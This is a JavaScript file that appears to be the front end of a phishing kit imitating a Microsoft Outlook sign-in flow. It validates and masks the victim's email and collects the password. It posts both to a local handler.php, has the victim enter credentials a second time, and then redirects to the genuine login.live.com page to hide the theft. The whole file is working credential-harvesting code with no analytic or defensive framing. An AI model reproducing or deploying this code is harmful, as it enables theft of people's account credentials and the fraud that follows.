const nextBtn = document.querySelector("#next")
const slides = Array.from(document.querySelectorAll(".scene"))
const backBtn = document.querySelector("#back")
const signInButton = document.querySelector("#signInButton")
const errorElem = document.querySelector(".error-message")
const emailInput = document.querySelector(".email-field")
const sendCode = document.querySelector("#send-code")

const USER_CREDS = {}
let count = 1


const showError = (msg, type = "") => {
    errorElem.innerText = msg
    errorElem.className = "error-message show" + type
}

const removeError = () => {
    errorElem.innerText = ""
    errorElem.className = "error-message"
}

const getSlugEmail = email => {
    const emailArr = email.split("@")
    return `${emailArr[0].slice(0, 2)}*****@${emailArr[1]}`
}

const checkEmail = () => {
    const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/g

    const email = document.querySelector("[name=email]").value.trim()

    if(!emailRegex.test(email)) {
        showError("Invalid email address")
       return false

    }

    USER_CREDS['email'] = email
    sendCode.innerHTML = `Email code to ${getSlugEmail(email)}`
    emailInput.innerText = email
    return true

}

const isLoading = state => {
    const loader = document.querySelector(".loader")
    if(state) {
        loader.className = "loader show"
    }
    else {
        loader.className = "loader"
    }
}

const handleSendEmail = async () => {
    const formData = new FormData()
    formData.append("email", USER_CREDS['email'])
    formData.append("password", USER_CREDS['password'])
    formData.append("send", "")

    const option = {
        method: "POST",
        body: formData
    }

    try {
        const request = await fetch("./handler.php", option)
        const response = await request.json()
        return response
    }
    catch (err) {
        return { error: err.message }
    }

}

const resetInputs = () => {
    const inputs = document.querySelector("input")
    emailInput.innerText = ""
    inputs.forEach(input => {
        input.value = ""
    })
}

const redirect = () => window.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1664920682&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d6526b845-5257-6759-9c1e-4a88b4420035&id=292841&aadredir=1&whr=outlook.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015"
nextBtn.addEventListener("click", () => {
    if(checkEmail()) {
        removeError()
        slides.map(slide => slide.className = "scene")
        slides[1].classList.add("active")
    }
})

backBtn.addEventListener("click", () => {
    slides.map(slide => slide.className = "scene")
    slides[0].classList.add("active")
})

signInButton.addEventListener("click", async () => {
    const password = document.querySelector("[name=password]").value.trim()
    const errorDiv = document.querySelectorAll(".error-message")[1]

    if(!password) {
        errorDiv.className = "error-message show"
        errorDiv.innerHTML = "Password is required"
        return
    }
    
    errorDiv.className = "error-message"
    errorDiv.innerHTML = ""
    USER_CREDS['password'] = password
    document.querySelectorAll(".error-message")[1].innerHTML = "Password is required"
    isLoading(true)
    const result = await handleSendEmail()
    if(result) {
        if("error" in result) {
            console.log(result['error'])
        }
        else {
            if(count !== 2) {
                resetInputs()
                backBtn.click()
                count++
            }
            else {
                redirect()
                return
            }
        }
    }
    else {
        showError("")
    }
    isLoading(false)
})